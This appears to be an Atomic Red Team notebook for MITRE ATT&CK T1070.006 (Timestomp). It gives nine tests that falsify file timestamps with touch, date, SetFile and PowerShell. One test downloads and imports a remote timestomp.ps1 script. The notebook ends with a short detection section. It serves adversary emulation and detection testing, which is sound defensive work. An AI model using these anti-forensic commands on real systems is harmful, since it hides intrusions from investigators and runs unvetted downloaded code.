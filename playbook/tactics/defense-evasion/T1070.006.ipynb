{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "3c427bbb",
   "metadata": {},
   "source": "# T1070.006 - Timestomp\nAdversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools.\n\nTimestomping may be used along with file name [Masquerading](https://attack.mitre.org/techniques/T1036) to hide malware and tools.(Citation: WindowsIR Anti-Forensic Techniques)"
  },
  {
   "cell_type": "markdown",
   "id": "b6de9441",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "816bfd54",
   "metadata": {},
   "source": "### Atomic Test #1 - Set a file's access timestamp\nStomps on the access timestamp of a file\n\n**Supported Platforms:** linux, macos\n#### Dependencies:  Run with `sh`!\n##### Description: The file must exist in order to be timestomped\n\n##### Check Prereq Commands:\n```sh\ntest -e /tmp/T1070.006-access.txt && exit 0 || exit 1\n\n```\n##### Get Prereq Commands:\n```sh\necho 'T1070.006 file access timestomp test' > /tmp/T1070.006-access.txt\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3243c173",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "84dc52dc",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\ntouch -a -t 197001010000.00 /tmp/T1070.006-access.txt\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "73c4d33c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "9f36112b",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm -f /tmp/T1070.006-access.txt\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8482ad64",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "fecc1e18",
   "metadata": {},
   "source": "### Atomic Test #2 - Set a file's modification timestamp\nStomps on the modification timestamp of a file\n\n**Supported Platforms:** linux, macos\n#### Dependencies:  Run with `sh`!\n##### Description: The file must exist in order to be timestomped\n\n##### Check Prereq Commands:\n```sh\ntest -e /tmp/T1070.006-modification.txt && exit 0 || exit 1\n\n```\n##### Get Prereq Commands:\n```sh\necho 'T1070.006 file modification timestomp test' > /tmp/T1070.006-modification.txt\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5358e579",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 2 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "604cbb6c",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\ntouch -m -t 197001010000.00 /tmp/T1070.006-modification.txt\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8876ccc2",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "880a3f7a",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm -f /tmp/T1070.006-modification.txt\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fdf0541a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "50b6f45e",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - Set a file's creation timestamp",
    "Stomps on the create timestamp of a file\n\nSetting the creation timestamp requires changing the system clock and reverting.\nSudo or root privileges are required to change date. Use with caution.\n",
    "**Supported Platforms:** linux, macos",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nNOW=$(date +%m%d%H%M%Y)\ndate 010100001971\ntouch /tmp/T1070.006-creation.txt\ndate \"$NOW\"\nstat /tmp/T1070.006-creation.txt\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f02f91c8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "19ef4ba1",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm -f /tmp/T1070.006-creation.txt\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6f2811d5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "a15415d0",
   "metadata": {},
   "source": "### Atomic Test #4 - Modify file timestamps using reference file\nModifies the `modify` and `access` timestamps using the timestamps of a specified reference file.\n\nThis technique was used by the threat actor Rocke during the compromise of Linux web servers.\n\n**Supported Platforms:** linux, macos\n#### Dependencies:  Run with `sh`!\n##### Description: The file must exist in order to be timestomped\n\n##### Check Prereq Commands:\n```sh\ntest -e /tmp/T1070.006-reference.txt && exit 0 || exit 1\n\n```\n##### Get Prereq Commands:\n```sh\necho 'T1070.006 reference file timestomp test' > /tmp/T1070.006-reference.txt\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4229d721",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 4 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "383afb38",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\ntouch -acmr /bin/sh /tmp/T1070.006-reference.txt\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2fc286a6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "2ffae358",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm -f /tmp/T1070.006-reference.txt\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e0b6f467",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "29554e64",
   "metadata": {},
   "source": "### Atomic Test #5 - Windows - Modify file creation timestamp with PowerShell\nModifies the file creation timestamp of a specified file. This technique was seen in use by the Stitch RAT.\nTo verify execution, use File Explorer to view the Properties of the file and observe that the Created time is the year 1970.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: A file must exist at the path (#{file_path}) to change the creation time on\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_timestomp.txt\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_timestomp.txt\" -Force | Out-Null\nSet-Content \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_timestomp.txt\" -Value \"T1551.006 Timestomp\" -Force | Out-Null\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c9974378",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 5 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "cb3133cb",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nGet-ChildItem \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_timestomp.txt\" | % { $_.CreationTime = \"01/01/1970 00:00:00\" }\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "48953e20",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "7fcdadf9",
   "metadata": {},
   "source": "### Atomic Test #6 - Windows - Modify file last modified timestamp with PowerShell\nModifies the file last modified timestamp of a specified file. This technique was seen in use by the Stitch RAT.\nTo verify execution, use File Explorer to view the Properties of the file and observe that the Modified time is the year 1970.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: A file must exist at the path (#{file_path}) to change the modified time on\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_timestomp.txt\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_timestomp.txt\" -Force | Out-Null\nSet-Content \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_timestomp.txt\" -Value \"T1551.006 Timestomp\" -Force | Out-Null\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0260c413",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 6 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "ab0f4d53",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nGet-ChildItem \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_timestomp.txt\" | % { $_.LastWriteTime = \"01/01/1970 00:00:00\" }\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0f76cd21",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "f50ba650",
   "metadata": {},
   "source": "### Atomic Test #7 - Windows - Modify file last access timestamp with PowerShell\nModifies the last access timestamp of a specified file. This technique was seen in use by the Stitch RAT.\nTo verify execution, use File Explorer to view the Properties of the file and observe that the Accessed time is the year 1970.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: A file must exist at the path (\"#{file_path}\") to change the last access time on\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_timestomp.txt\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_timestomp.txt\" -Force | Out-Null\nSet-Content \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_timestomp.txt\" -Value \"T1551.006 Timestomp\" -Force | Out-Null\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3f4aac73",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 7 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "460fff19",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nGet-ChildItem \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_timestomp.txt\" | % { $_.LastAccessTime = \"01/01/1970 00:00:00\" }\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2c9377ab",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "c8ecc5ba",
   "metadata": {},
   "source": "### Atomic Test #8 - Windows - Timestomp a File\nTimestomp kxwn.lock.\n\nSuccessful execution will include the placement of kxwn.lock in #{file_path} and execution of timestomp.ps1 to modify the time of the .lock file. \n\n[Mitre ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/master/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/defensive-evasion/4a2ad84e-a93a-4b2e-b1f0-c354d6a41278.yml)\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: timestomp.ps1 must be present in #{file_path}.\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\timestomp.ps1\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nInvoke-WebRequest \"https://raw.githubusercontent.com/mitre-attack/attack-arsenal/bc0ba1d88d026396939b6816de608cb279bfd489/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/timestomp.ps1\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\timestomp.ps1\"\n\n```\n##### Description: kxwn.lock must be present in #{file_path}.\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\kxwn.lock\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\kxwn.lock\" -ItemType File\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "14d3f199",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 8 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "08636f80",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nimport-module \"PathToAtomicsFolder\\..\\ExternalPayloads\\timestomp.ps1\"\ntimestomp -dest \"PathToAtomicsFolder\\..\\ExternalPayloads\\kxwn.lock\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c1d781e3",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 8"
  },
  {
   "cell_type": "markdown",
   "id": "5a104ce9",
   "metadata": {},
   "source": "### Atomic Test #9 - MacOS - Timestomp Date Modified\nStomps on the modification timestamp of a file using MacOS's SetFile utility\n\n**Supported Platforms:** macos\n#### Dependencies:  Run with `sh`!\n##### Description: The file must exist in order to be timestomped\n\n##### Check Prereq Commands:\n```sh\ntest -e /tmp/T1070.006-modified.txt && exit 0 || exit 1\n\n```\n##### Get Prereq Commands:\n```sh\necho 'T1070.006 MacOS file modified timestomp test' > /tmp/T1070.006-modified.txt\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fbec6be9",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 9 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "8b827c9d",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nSetFile -m 01/01/1970 /tmp/T1070.006-modified.txt\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b1196cd8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 9"
  },
  {
   "cell_type": "markdown",
   "id": "5f6e1d4e",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm -f /tmp/T1070.006-modified.txt\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "99f9d936",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 9 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "515e973c",
   "metadata": {},
   "source": "## Detection\nForensic techniques exist to detect aspects of files that have had their timestamps modified. (Citation: WindowsIR Anti-Forensic Techniques) It may be possible to detect timestomping using file modification monitoring that collects information on file handle opens and can compare timestamp values."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}